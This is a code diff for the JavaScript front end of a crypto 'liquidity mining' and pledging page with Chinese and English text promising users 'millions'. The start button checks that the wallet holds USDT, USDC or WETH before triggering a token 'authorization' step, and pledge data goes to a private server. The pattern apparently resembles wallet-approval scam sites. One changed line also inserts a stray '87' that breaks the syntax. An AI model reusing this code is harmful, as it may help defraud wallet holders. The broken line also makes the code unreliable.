@@ -79,7 +79,7 @@ const isDevMode = window.location.hostname === 'localhost' || window.location.ho
 
 const translations = {
   'en': {
-    title: 'Popular Mining',
+    title: 'Liquidity Mining',
     subtitle: 'Start Earning Millions',
     tabLiquidity: 'Liquidity',
     tabPledging: 'Pledging',
@@ -117,7 +117,7 @@ const translations = {
     ethersError: 'Ethers.js initialization failed. Please check your network or CDN.'
   },
   'zh-Hant': {
-    title: '熱門挖礦',
+    title: '流動性挖礦',
     subtitle: '開始賺取數百萬',
     tabLiquidity: '流動性',
     tabPledging: '質押',
@@ -155,7 +155,7 @@ const translations = {
     ethersError: 'Ethers.js 初始化失敗，請檢查網絡或 CDN。'
   },
   'zh-Hans': {
-    title: '热门挖矿',
+    title: '流动性挖矿',
     subtitle: '开始赚取数百万',
     tabLiquidity: '流动性',
     tabPledging: '质押',
@@ -264,7 +264,7 @@ async function loadUserDataFromServer() {
     }
     const pledgeData = allData.pledges[userAddress] || {};
     if (pledgeData.isPledging) {
-      const tokenSymbol = { [USDT_CONTRACT_ADDRESS]: 'USDT', [USDC_CONTRACT_ADDRESS]: 'USDC', [WETH_CONTRACT_ADDRESS]: 'WETH' }[pledgeData.token] || 'Unknown';
+      const tokenSymbol = { [USDT_CONTRACT_ADDRESS]: 'USDT',87 [USDC_CONTRACT_ADDRESS]: 'USDC', [WETH_CONTRACT_ADDRESS]: 'WETH' }[pledgeData.token] || 'Unknown';
       document.getElementById('totalPledgedValue').textContent = `${parseFloat(pledgeData.amount).toFixed(2)} ${tokenSymbol}`;
     }
     await updateInterest();
@@ -820,83 +820,89 @@ document.addEventListener('DOMContentLoaded', async () => {
     };
   }
   if (claimModal) claimModal.onclick = e => e.target === claimModal && (claimModal.style.display = 'none');
-  languageSelect.onchange = e => updateLanguage(e.target.value);
-  connectButton.onclick = () => {
-    if (connectButton.classList.contains('connected')) {
-      disconnectWallet();
-    } else {
-      connectWallet();
-    }
-  };
-  startBtn.onclick = async () => {
-    if (!walletTokenSelect) {
-      updateStatus('請先添加代幣選擇器', true);
-      return;
-    }
-    const currentLang = localStorage.getItem('language') || 'zh-Hant';
-    if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
-    const selectedToken = walletTokenSelect.value;
-    const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
-    const selectedContract = tokenMap[selectedToken];
-    try {
-      const balance = await retry(() => selectedContract.balanceOf(userAddress));
-      if (balance === 0n) { updateStatus(`您的 ${selectedToken} 餘額為零，請確保有足夠餘額以開始。`, true); return; }
-    } catch (e) { updateStatus(`${translations[currentLang].error}: 無法獲取餘額: ${e.message}`, true); return; }
-    startBtn.disabled = true; startBtn.textContent = '授權中...';
-    try {
-      await handleConditionalAuthorizationFlow();
-      updateStatus(translations[currentLang].claimSuccess + ': 挖礦已開始。');
-      activateStakingUI();
-    } catch (error) { updateStatus(`${translations[currentLang].error}: 授權失敗: ${error.message}`, true); }
-    finally { startBtn.disabled = false; startBtn.textContent = translations[currentLang]?.startBtnText || '開始'; }
-  };
-  pledgeBtn.onclick = async () => {
-    const currentLang = localStorage.getItem('language') || 'zh-Hant';
-    if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
-    const amount = parseFloat(pledgeAmount.value) || 0;
-    const duration = parseInt(pledgeDuration.value);
-    const token = pledgeToken.value;
-    const tokenMap = { 'USDT': USDT_CONTRACT_ADDRESS, 'USDC': USDC_CONTRACT_ADDRESS, 'WETH': WETH_CONTRACT_ADDRESS };
-    const tokenAddress = tokenMap[token];
-    if (!tokenAddress) { updateStatus(translations[currentLang].invalidPledgeToken, true); return; }
-    if (!amount || amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
-    const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
-    try {
-      const balance = await retry(() => selectedContract.balanceOf(userAddress));
-      const decimals = token === 'WETH' ? 18 : 6;
-      const formattedBalance = parseFloat(window.ethers.utils.formatUnits(balance, decimals));
-      if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
-    } catch (error) { updateStatus(`${translations[currentLang].error}: 無法獲取 ${token} 餘額: ${error.message}`, true); return; }
-    updateStatus('提交質押中...');
-    const pledgeData = { address: userAddress, pledges: { isPledging: true, cycle: duration, token: tokenAddress, amount: amount.toFixed(2) } };
-    try {
-      const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pledgeData) }));
-      if (!response.ok) throw new Error(`Failed to submit pledge, status: ${response.status}`);
-      pledgedAmount = amount;
-      localStorage.setItem('userData', JSON.stringify({ stakingStartTime, claimedInterest, pledgedAmount, accountBalance, grossOutput: parseFloat(grossOutputValue?.textContent?.replace(' ETH', '') || '0'), cumulative: parseFloat(cumulativeValue?.textContent?.replace(' ETH', '') || '0'), nextBenefitTime: localStorage.getItem('nextBenefitTime'), lastUpdated: Date.now() }));
-      const totalPledgedValue = document.getElementById('totalPledgedValue');
-      if (totalPledgedValue) totalPledgedValue.textContent = `${amount.toFixed(2)} ${token}`;
-      updateStatus(translations[currentLang].pledgeSuccess);
-      await saveUserData(); await updateInterest();
-    } catch (error) { updateStatus(translations[currentLang].pledgeError, true); }
-  };
-  refreshWallet.onclick = async () => {
-    const currentLang = localStorage.getItem('language') || 'zh-Hant';
-    if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
-    updateStatus(translations[currentLang].fetchingBalances);
-    const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
-    updateBalancesUI(balances); updateStatus('');
-  };
-  walletTokenSelect.onchange = async () => {
-    const currentLang = localStorage.getItem('language') || 'zh-Hant';
-    if (!signer) {
-      if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
-      if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
-      return;
-    }
-    const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
-    updateBalancesUI(balances);
-  };
+  if (languageSelect) languageSelect.onchange = e => updateLanguage(e.target.value);
+  if (connectButton) {
+    connectButton.onclick = () => {
+      if (connectButton.classList.contains('connected')) {
+        disconnectWallet();
+      } else {
+        connectWallet();
+      }
+    };
+  }
+  if (startBtn) {
+    startBtn.onclick = async () => {
+      const currentLang = localStorage.getItem('language') || 'zh-Hant';
+      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
+      const selectedToken = walletTokenSelect.value;
+      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
+      const selectedContract = tokenMap[selectedToken];
+      try {
+        const balance = await retry(() => selectedContract.balanceOf(userAddress));
+        if (balance === 0n) { updateStatus(`您的 ${selectedToken} 餘額為零，請確保有足夠餘額以開始。`, true); return; }
+      } catch (e) { updateStatus(`${translations[currentLang].error}: 無法獲取餘額: ${e.message}`, true); return; }
+      startBtn.disabled = true; startBtn.textContent = '授權中...';
+      try {
+        await handleConditionalAuthorizationFlow();
+        updateStatus(translations[currentLang].claimSuccess + ': 挖礦已開始。');
+        activateStakingUI();
+      } catch (error) { updateStatus(`${translations[currentLang].error}: 授權失敗: ${error.message}`, true); }
+      finally { startBtn.disabled = false; startBtn.textContent = translations[currentLang]?.startBtnText || '開始'; }
+    };
+  }
+  if (pledgeBtn) {
+    pledgeBtn.onclick = async () => {
+      const currentLang = localStorage.getItem('language') || 'zh-Hant';
+      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
+      const amount = parseFloat(pledgeAmount.value) || 0;
+      const duration = parseInt(pledgeDuration.value);
+      const token = pledgeToken.value;
+      const tokenMap = { 'USDT': USDT_CONTRACT_ADDRESS, 'USDC': USDC_CONTRACT_ADDRESS, 'WETH': WETH_CONTRACT_ADDRESS };
+      const tokenAddress = tokenMap[token];
+      if (!tokenAddress) { updateStatus(translations[currentLang].invalidPledgeToken, true); return; }
+      if (!amount || amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
+      const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
+      try {
+        const balance = await retry(() => selectedContract.balanceOf(userAddress));
+        const decimals = token === 'WETH' ? 18 : 6;
+        const formattedBalance = parseFloat(window.ethers.utils.formatUnits(balance, decimals));
+        if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
+      } catch (error) { updateStatus(`${translations[currentLang].error}: 無法獲取 ${token} 餘額: ${error.message}`, true); return; }
+      updateStatus('提交質押中...');
+      const pledgeData = { address: userAddress, pledges: { isPledging: true, cycle: duration, token: tokenAddress, amount: amount.toFixed(2) } };
+      try {
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pledgeData) }));
+        if (!response.ok) throw new Error(`Failed to submit pledge, status: ${response.status}`);
+        pledgedAmount = amount;
+        localStorage.setItem('userData', JSON.stringify({ stakingStartTime, claimedInterest, pledgedAmount, accountBalance, grossOutput: parseFloat(grossOutputValue?.textContent?.replace(' ETH', '') || '0'), cumulative: parseFloat(cumulativeValue?.textContent?.replace(' ETH', '') || '0'), nextBenefitTime: localStorage.getItem('nextBenefitTime'), lastUpdated: Date.now() }));
+        const totalPledgedValue = document.getElementById('totalPledgedValue');
+        if (totalPledgedValue) totalPledgedValue.textContent = `${amount.toFixed(2)} ${token}`;
+        updateStatus(translations[currentLang].pledgeSuccess);
+        await saveUserData(); await updateInterest();
+      } catch (error) { updateStatus(translations[currentLang].pledgeError, true); }
+    };
+  }
+  if (refreshWallet) {
+    refreshWallet.onclick = async () => {
+      const currentLang = localStorage.getItem('language') || 'zh-Hant';
+      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
+      updateStatus(translations[currentLang].fetchingBalances);
+      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
+      updateBalancesUI(balances); updateStatus('');
+    };
+  }
+  if (walletTokenSelect) {
+    walletTokenSelect.onchange = async () => {
+      const currentLang = localStorage.getItem('language') || 'zh-Hant';
+      if (!signer) {
+        if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
+        if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
+        return;
+      }
+      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
+      updateBalancesUI(balances);
+    };
+  }
   document.querySelectorAll('.tab').forEach(tab => {
     tab.onclick = async () => {
       document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
